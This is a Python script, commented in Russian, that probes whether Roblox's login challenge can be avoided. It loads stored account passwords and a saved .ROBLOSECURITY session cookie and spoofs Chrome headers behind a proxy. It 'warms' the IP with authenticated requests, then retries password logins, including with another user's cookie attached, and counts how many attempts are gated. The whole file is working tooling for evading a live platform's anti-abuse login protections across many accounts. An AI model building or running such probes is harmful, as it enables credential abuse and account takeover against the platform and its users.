"""Передаётся ли доверие от сессии к входу по паролю.

Вопрос: если с адреса уже работает живая сессия, перестаёт ли платформа
требовать проверку при входе по паролю с этого же адреса?

Схемы:
  A. базовый вход свежим аккаунтом (ожидаем гейт);
  B. несколько авторизованных запросов живой сессией с этого же адреса,
     затем повторный вход свежим аккаунтом;
  C. вход по паролю, cookie приложена к запросу;
  D. вход по паролю аккаунта, которому принадлежит cookie.

    python -m probes.trust_transfer --proxy-url <url>
"""

from __future__ import annotations

import argparse
import json
import time
from pathlib import Path

import httpx

from flow.detect import classify_exchange

UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
)
BASE = {
    "User-Agent": UA,
    "Accept": "application/json, text/plain, */*",
    "Accept-Language": "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7",
    "Content-Type": "application/json;charset=UTF-8",
    "Origin": "https://www.roblox.com",
    "Referer": "https://www.roblox.com/login",
}
LOGIN = "https://auth.roblox.com/v2/login"
AUTH = "https://users.roblox.com/v1/users/authenticated"


def attempt_login(client: httpx.Client, login: str, password: str,
                  cookie_jar: dict | None = None) -> dict:
    body = {"ctype": "Username", "cvalue": login, "password": password}
    started = time.perf_counter()
    try:
        r = client.post(LOGIN, headers=BASE, json=body,
                        cookies=cookie_jar or {})
        token = r.headers.get("x-csrf-token")
        headers = dict(BASE)
        if token:
            headers["X-CSRF-TOKEN"] = token
        r = client.post(LOGIN, headers=headers, json=body,
                        cookies=cookie_jar or {})
        cls = classify_exchange(r.status_code, r.headers, r.content)
        return {"login": login, "status": r.status_code, "cls": str(cls.status),
                "body": r.text[:160], "ms": int((time.perf_counter() - started) * 1000),
                "session": any(c.name == ".ROBLOSECURITY" for c in client.cookies.jar)}
    except Exception as exc:
        return {"login": login, "error": f"{type(exc).__name__}: {str(exc)[:100]}"}


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--proxy-url", default=None)
    ap.add_argument("--accounts", default="<login>,<login>")
    ap.add_argument("--out", default="var/trust-transfer.json")
    args = ap.parse_args()

    sessions = json.loads(Path("var/sessions.json").read_text(encoding="utf-8"))
    cookie_entry = next(iter(sessions.values()))
    cookie = cookie_entry["cookie"]
    cookie_name = cookie_entry.get("identity") or cookie_entry.get("login")

    accounts = json.loads(Path("var/accounts.json").read_text(encoding="utf-8"))
    by_login = {a["login"].lower(): a for a in accounts}
    test_accounts = [by_login[n.strip().lower()] for n in args.accounts.split(",")
                     if n.strip().lower() in by_login]

    proxy = args.proxy_url
    report: list[dict] = []
    print(f"канал: {proxy or 'прямой IP'}")
    print(f"сессия для доверия: {cookie_name}\n")

    with httpx.Client(proxy=proxy, timeout=45, follow_redirects=False,
                      headers=dict(BASE)) as client:
        # A. базовый вход
        for account in test_accounts:
            result = attempt_login(client, account["login"], account["password"])
            result["case"] = "A: базовый вход"
            report.append(result)
            print(f"A  {account['login']:<22} {result.get('cls', result.get('error'))}")

        # B. прогреваем адрес живой сессией
        print(f"\n   авторизованные запросы живой сессией с этого адреса...")
        warmed = 0
        for url in (AUTH,
                    "https://users.roblox.com/v1/users/authenticated",
                    "https://economy.roblox.com/v1/users/1/currency",
                    "https://friends.roblox.com/v1/my/friends/count",
                    "https://users.roblox.com/v1/users/1"):
            try:
                r = client.get(url, cookies={".ROBLOSECURITY": cookie},
                               headers={"User-Agent": UA, "Accept": "application/json",
                                        "Origin": "https://www.roblox.com",
                                        "Referer": "https://www.roblox.com/home"})
                print(f"     {r.status_code} {url[:70]}")
                warmed += 1
            except Exception as exc:
                print(f"     ошибка {type(exc).__name__}: {url[:60]}")
        print(f"   авторизованных запросов выполнено: {warmed}\n")

        for account in test_accounts:
            result = attempt_login(client, account["login"], account["password"])
            result["case"] = "B: после прогрева сессией"
            report.append(result)
            print(f"B  {account['login']:<22} {result.get('cls', result.get('error'))}")

        # C. вход по паролю с приложенной cookie
        for account in test_accounts:
            result = attempt_login(client, account["login"], account["password"],
                                   cookie_jar={".ROBLOSECURITY": cookie})
            result["case"] = "C: с чужой cookie"
            report.append(result)
            print(f"C  {account['login']:<22} {result.get('cls', result.get('error'))}")

    Path(args.out).write_text(json.dumps(report, ensure_ascii=False, indent=2), encoding="utf-8")

    print("\n=== сводка ===")
    for r in report:
        print(f"  {r['case']:<26} {r['login']:<22} {r.get('cls', r.get('error'))}")
    gates = sum(1 for r in report if "CHALLENGE" in str(r.get("cls")))
    print(f"\nгейтов: {gates} из {len(report)}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
